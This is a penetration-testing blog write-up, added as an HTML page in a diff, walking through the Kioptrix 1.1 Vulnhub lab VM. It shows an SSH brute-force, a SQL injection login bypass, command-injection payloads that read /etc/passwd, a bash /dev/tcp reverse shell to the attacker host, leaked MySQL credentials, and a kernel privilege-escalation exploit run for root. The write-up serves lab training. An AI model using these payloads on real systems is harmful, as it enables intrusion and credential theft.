@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="generator" content="Hugo 0.80.0" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://shiny-labs.re/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://shiny-labs.re/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://shiny-labs.re/favicon-16x16.png">
+    <link rel="manifest" href="https://shiny-labs.re/site.webmanifest">
+    <link rel="mask-icon" href="https://shiny-labs.re/safari-pinned-tab.svg" color="#000000">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="theme-color" content="#ffffff">
+
+
+    <link rel="stylesheet" href="https://shiny-labs.re/css/bulma.min.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/main.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/syntax.css">
+
+    
+    <title>shiny-labs || Vulnhub - Kioptrix 1.1 (#2)</title>
+</head>
+<body><nav class="navbar" role="navigation" aria-label="main navigation">
+    <div class="navbar-brand">
+        <a class="navbar-item no-squiggly" href="https://shiny-labs.re/">
+            <h1 id="logo" class="glitch">shiny-labs</h1>
+        </a>
+    </div>
+
+    <div class="navbar-menu">
+        <div class="navbar-start">
+            
+        </div>
+
+        <div class="navbar-end">
+            
+            <h3 id="subtitle">Exploit, reverse engineering and cats.</h3>
+        </div>
+    </div>
+</nav>
+
+<div id="content">
+
+            <div class="columns is-centered">
+                <div class="column is-three-fifths" id="menu-column"><div id="menu" class="tabs is-centered is-medium">
+    <ul>
+            <li><a href="https://shiny-labs.re/" class="no-squiggly">Home</a></li>
+            <li><a href="https://shiny-labs.re/archives/" class="no-squiggly">Archives</a></li>
+            <li><a href="https://shiny-labs.re/tags/" class="no-squiggly">Tags</a></li>
+            <li><a href="https://shiny-labs.re/about/" class="no-squiggly">About</a></li>
+  </ul>
+</div>
+
+<div class="columns">
+<div class="column is-10" id="main-column">
+    <article class="article">
+        <div >
+            <h1 class="article-title">Vulnhub - Kioptrix 1.1 (#2)</h1>
+            
+<div class="post-meta">
+  <p class="article-meta">
+  <span>Date</span> &#x5b;
+  <time datetime="April 18, 2020">
+      Apr 18
+    </time>
+  &#x5d;
+        
+        
+  <span>Categories</span> &#x5b;
+    <a href="https://shiny-labs.re/categories/pentest">pentest</a>
+  &#x5d;
+        
+        
+  <span>Tags</span> &#x5b;
+    <a href="https://shiny-labs.re/tags"></a>
+  &#x5d;
+  </p>
+</div>
+
+        </div>
+        <div>
+            <p>Kioptrix level 2, here we go! Follow along by grabbing the VM on <a href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">https://www.vulnhub.com/entry/kioptrix-level-11-2,23/</a>. Make sure to download the level 2 - updated version as the first release had a bug in the web application.</p>
+<p>The goal is the same than the previous one: get root by any possible mean.</p>
+<h1 id="fixing-the-network">Fixing the network</h1>
+<p>As the previous Kioptrix, the network wasn&rsquo;t working out of the box for me.</p>
+<ul>
+<li>
+<p>Shut down the VM</p>
+</li>
+<li>
+<p>Edit the <code>CentOs4.5.vmx</code> file and replace:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">ethernet0.connectionType = &#34;bridged&#34;
+</code></pre></div><p>with:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">ethernet0.connectionType = &#34;NAT&#34;
+</code></pre></div></li>
+<li>
+<p>Start the VM</p>
+</li>
+</ul>
+<h1 id="get-the-ip-of-the-vm">Get the IP of the VM</h1>
+<p>Run <code>arp-scan</code> from your kali box:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ sudo arp-scan 172.16.149.0/24
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:fd:2b:71, IPv4: 172.16.149.129
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+172.16.149.1	00:50:56:c0:00:08	VMware, Inc.
+172.16.149.2	00:50:56:fd:11:d0	VMware, Inc.
+172.16.149.131	00:0c:29:d1:f5:b9	VMware, Inc.
+172.16.149.254	00:50:56:fe:b1:9f	VMware, Inc.
+
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 2.069 seconds (123.73 hosts/sec). 4 responded
+</code></pre></div><p>The target VM has IP 172.16.149.131.</p>
+<h1 id="recon">Recon</h1>
+<p>Extracting the archive already gives us the OS: <code>CentOs 4.5</code></p>
+<p>Let&rsquo;s run nmap to discover the services:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ sudo nmap -T4 -p- -A -oA nmap_tcp 172.16.149.131
+</code></pre></div><p>List of services and ports:</p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service and Version</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22</td>
+<td>OpenSSH 3.9p1 (protocol 1.99)</td>
+</tr>
+<tr>
+<td>80</td>
+<td>Apache httpd 2.0.52 ((CentOS))</td>
+</tr>
+<tr>
+<td>111</td>
+<td>rpcbind 2 (RPC #100000)</td>
+</tr>
+<tr>
+<td>631</td>
+<td>CUPS 1.1</td>
+</tr>
+<tr>
+<td>856</td>
+<td>1 (RPC #100024)</td>
+</tr>
+<tr>
+<td>3306</td>
+<td>mysql</td>
+</tr>
+</tbody>
+</table>
+<h1 id="22-ssh">22 SSH</h1>
+<p>I started running a SSH brute-force in the background, just in case it gets somewhere:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -V ssh://172.16.149.131
+</code></pre></div><p>Spoiler: it didn&rsquo;t work ~~</p>
+<p>Looking for CVEs with public exploits didn&rsquo;t turn  up anything interesting either.</p>
+<p>Looks like a dead end&hellip; Let&rsquo;s go and poke something else :D</p>
+<h1 id="80443-apache-server">80/443 Apache server</h1>
+<p>What do we know so far?</p>
+<ul>
+<li>Apache 2.0.52 (centOS)</li>
+<li>PHP/4.3.9 from the HTTP header <code>X-Powered-By</code></li>
+</ul>
+<h2 id="login-form">Login Form</h2>
+<p><img src="00_apache.png" alt=""></p>
+<p>Checking the source code of the page:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">&lt;!-- Start of HTML when logged in as Administator --&gt;
+</code></pre></div><p>Username might be Administrator ? Administator ? I tried a bunch of default login/passwords, nothing :(</p>
+<p>Next, I started a nikto and gobuster scans in the background while I poke other stuff:</p>
+<p>nikto scan:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ nikto -output=nikto.txt -host http://172.16.149.131
+</code></pre></div><p>gobuster scan:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"> $ gobuster dir -o gobuster.txt -u http://172.16.149.131 -w /usr/share/dirb/wordlists/common.txt 
+</code></pre></div><p>What if there&rsquo;s an interesting CVE for apache 2.0.52? Couldn&rsquo;t find anything :(</p>
+<p>Maybe a SQL injection then? We know the database is a mysql (from the Nmap scan), let&rsquo;s try a basic SQLi:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">&#39; or 1=1#
+</code></pre></div><p>This input in the username field lets us pass the authentication page /o/</p>
+<h2 id="the-basic-administrative-web-console">The Basic Administrative Web Console</h2>
+<p><img src="01_apache.png" alt=""></p>
+<p>We know have access to a utility to ping a machine on the network:</p>
+<p><img src="02_apache.png" alt=""></p>
+<p>Behind the scenes, the command used probably looks like:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">ping -c 3 &lt;ip&gt;
+</code></pre></div><p>Can we do more than ping though? Let&rsquo;s checkout a few command injection techniques:</p>
+<ul>
+<li><code>172.16.149.131; cat /etc/shadow</code></li>
+<li><code>172.16.149.131 &amp;&amp;  cat /etc/shadow</code></li>
+<li><code>172.16.149.131 $(cat /etc/shadow)</code></li>
+</ul>
+<p>No luck getting these to work. Then I realized that maybe I should be running commands that don&rsquo;t require privileges&hellip;</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">; cat /etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+news:x:9:13:news:/etc/news:
+uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
+rpm:x:37:37::/var/lib/rpm:/sbin/nologin
+haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
+netdump:x:34:34:Network Crash Dump user:/var/crash:/bin/bash
+nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
+mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
+smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
+pcap:x:77:77::/var/arpwatch:/sbin/nologin
+apache:x:48:48:Apache:/var/www:/sbin/nologin
+squid:x:23:23::/var/spool/squid:/sbin/nologin
+webalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin
+xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
+ntp:x:38:38::/etc/ntp:/sbin/nologin
+pegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
+john:x:500:500::/home/john:/bin/bash
+harold:x:501:501::/home/harold:/bin/bash
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">; whoami
+
+apache
+</code></pre></div><p>So, we are running commands as <code>apache</code>, which explains why we can&rsquo;t just <code>cat /etc/shadow</code>&hellip;</p>
+<p>A <code>ls</code> and  a <code>cat</code> in the current directory allows us to peek at the php source code:</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="p">;</span> <span class="nx">cat</span> <span class="nx">index</span><span class="o">.</span><span class="nx">php</span>
+<span class="o">&lt;?</span><span class="nx">php</span>
+	<span class="nx">mysql_connect</span><span class="p">(</span><span class="s2">&#34;localhost&#34;</span><span class="p">,</span> <span class="s2">&#34;john&#34;</span><span class="p">,</span> <span class="s2">&#34;hiroshima&#34;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nx">mysql_error</span><span class="p">());</span>
+	<span class="c1">//print &#34;Connected to MySQL&lt;br /&gt;&#34;;
+</span><span class="c1"></span>	<span class="nx">mysql_select_db</span><span class="p">(</span><span class="s2">&#34;webapp&#34;</span><span class="p">);</span>
+	
+	<span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&#34;&#34;</span><span class="p">){</span>
+		<span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">];</span>
+		<span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;psw&#39;</span><span class="p">];</span>
+		<span class="nv">$query</span> <span class="o">=</span> <span class="s2">&#34;SELECT * FROM users WHERE username = &#39;</span><span class="si">$username</span><span class="s2">&#39; AND password=&#39;</span><span class="si">$password</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+		<span class="c1">//print $query.&#34;
+</span><span class="c1"></span><span class="s2">&#34;;
+</span><span class="s2">		</span><span class="si">$result</span><span class="s2"> = mysql_query(</span><span class="si">$query</span><span class="s2">);
+</span><span class="s2">
+</span><span class="s2">		</span><span class="si">$row</span><span class="s2"> = mysql_fetch_array(</span><span class="si">$result</span><span class="s2">);
+</span><span class="s2">		//print &#34;</span><span class="nx">ID</span><span class="o">:</span> <span class="s2">&#34;.</span><span class="si">$row[&#39;id&#39;]</span><span class="s2">.&#34;</span>
+<span class="s2">&#34;;
+</span><span class="s2">	}
+</span><span class="s2">
+</span><span class="s2">?&gt;
+</span></code></pre></div><p>Some creds here for mysql: <code>john:hiroshima</code>,  let&rsquo;s take a note of that somewhere.</p>
+<p>And <code>pingip.php</code> is exactly what we thought:</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="p">;</span> <span class="nx">cat</span> <span class="nx">pingit</span><span class="o">.</span><span class="nx">php</span>
+<span class="o">&lt;?</span><span class="nx">php</span>
+<span class="s1">&#39;;
+</span><span class="s1">        echo shell_exec( &#39;</span><span class="nx">ping</span> <span class="o">-</span><span class="nx">c</span> <span class="mi">3</span> <span class="s1">&#39; . $target );
+</span><span class="s1">        echo &#39;</span>
+
+<span class="err">&#39;</span><span class="p">;</span> <span class="p">}</span> <span class="cp">?&gt;</span><span class="err"> 
+</span></code></pre></div><p>Okay, let&rsquo;s setup a reverse shell so we don&rsquo;t have to use the webpage for every command!</p>
+<p>Run a listening netcat on the kali box:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">kali@kali:~$ nc -lvp 80
+</code></pre></div><p>Use this input in the &ldquo;administrative web console&rdquo;:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="p">;</span> bash -i &gt;<span class="p">&amp;</span> /dev/tcp/172.16.149.129/80 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</code></pre></div><p><img src="03_reverse_shell.png" alt=""></p>
+<p>Enjoy your shell on the kali box !</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">bash-3.00$ cat /etc/redhat-release
+CentOS release 4.5 (Final)
+bash-3.00$ uname -a
+Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
+</code></pre></div><h2 id="from-apache-to-root">From Apache to root</h2>
+<p>After a bit of looking around, I couldn&rsquo;t find any other way to escalate my privileges to root without using a kernel exploit. In general, you want to avoid those, as they are not super stable and tend to crash the target. which is okay on a CTF, less okay IRL&hellip;</p>
+<p>Anyway, here goes the nuclear option: looking for kernel exploits on exploit-db:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">kali@kali:~$ searchsploit Linux 2.6
+Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - &#39;sock_sendpage()&#39; Local Privilege Escalation     | exploits/linux/local/9545.c
+</code></pre></div><p>Great, a local privilege escalation, sounds perfect. Let&rsquo;s download the source code on the target:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">bash-3.00$ wget https://www.exploit-db.com/raw/9545
+--15:33:54--  https://www.exploit-db.com/raw/9545
+           =&gt; `9545&#39;
+Resolving www.exploit-db.com... 192.124.249.8
+Connecting to www.exploit-db.com|192.124.249.8|:443... connected.
+OpenSSL: error:1407742E:SSL routines:SSL23_GET_SERVER_HELLO:tlsv1 alert protocol version
+Unable to establish SSL connection.
+</code></pre></div><p>Ah. A <code>wget</code> or <code>curl</code> directly from exploit-db will not work&hellip; That box is very old :&lsquo;D</p>
+<p>No problemo, I&rsquo;ll just encode the exploit into base64 and paste it on the box!</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">bash-3.00$ cat 9545.b64 | base64 -d &gt; 9545.c
+bash: base64: command not found
+bash: [13447: 4] tcsetattr: Invalid argument
+</code></pre></div><p>Okay, no base64&hellip; Let&rsquo;s look for something else then&hellip;</p>
+<p>WHAT KIND OF BOX HAS PYTHON BUT NOT BASE64.</p>
+<p>Okay, nevermind, let&rsquo;s do that the other way. Start a web server on the kali, download the exploit there and expose it:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">kali@kali:~$ cd /tmp
+kali@kali:/tmp$ get https://www.exploit-db.com/raw/9545
+kali@kali:/tmp$ python -m SimpleHTTPServer 80
+</code></pre></div><p>Then use wget on the target to download the exploit from our fresh web server:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">bash-3.00$ cd /tmp
+bash-3.00$ wget 172.16.149.129/9545
+--18:12:24--  http://172.16.149.129/9545
+           =&gt; `9545&#39;
+Connecting to 172.16.149.129:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 6,087 (5.9K) [application/octet-stream]
+
+    0K .....                                                 100%    8.90 MB/s
+
+18:12:24 (8.90 MB/s) - `9545&#39; saved [6087/6087]
+
+</code></pre></div><p>Wuhuuu, we&rsquo;ve finally managed to transfer the exploit on the box. Next is compilation:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">bash-3.00$ gcc 9545.c -o 9545
+</code></pre></div><p>Then run the fresh-from-the-oven binary:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">bash-3.00$ ./9545
+sh: no job control in this shell
+sh-3.00# id
+uid=0(root) gid=0(root) groups=48(apache)
+</code></pre></div><p>Well, I&rsquo;m impressed. A kernel exploit that works on the first try without crashing the box?! :o</p>
+<p>Takeaways:</p>
+<ul>
+<li>Try your command injection with commands that don&rsquo;t require privileges</li>
+<li>Running a web server on the kali box can be a solution to exchange files with the target.</li>
+</ul>
+<p>There it is gentlepeople, see you around for the next kioptrix box!</p>
+<h1 id="links">Links</h1>
+<ul>
+<li>Very good cheat sheet on command injection, check out the rest of the repo also, it&rsquo;s a gold mine</li>
+</ul>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection</a></p>
+<ul>
+<li>Another cheat sheet on reverse shell: <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></li>
+</ul>
+<p><img src="cat_laptop.gif" alt=""></p>
+
+        </div>
+    </article>
+</div>
+
+
+<div class="column" id="toc-column">    <aside>
+        <div id="toc">
+            What's on this page?
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#fixing-the-network">Fixing the network</a></li>
+    <li><a href="#get-the-ip-of-the-vm">Get the IP of the VM</a></li>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#22-ssh">22 SSH</a></li>
+    <li><a href="#80443-apache-server">80/443 Apache server</a>
+      <ul>
+        <li><a href="#login-form">Login Form</a></li>
+        <li><a href="#the-basic-administrative-web-console">The Basic Administrative Web Console</a></li>
+        <li><a href="#from-apache-to-root">From Apache to root</a></li>
+      </ul>
+    </li>
+    <li><a href="#links">Links</a></li>
+  </ul>
+</nav>
+        </div>
+    </aside>
+
+</div>
+
+</div></div>
+            </div><footer class="footer">
+  <div class="content has-text-centered">
+    <p>
+        <div class="copyright">
+        
+            Handcrafted with <span style="color: #e25555;">&hearts;</span> by kylma
+        
+        </div>
+
+    </p>
+  </div>
+
+  <div id="to-top">
+    <a href="#logo" class="top-btn no-squiggly">^</a>
+  </div>
+
+</footer>
+</div>
+    </body>
+</html>
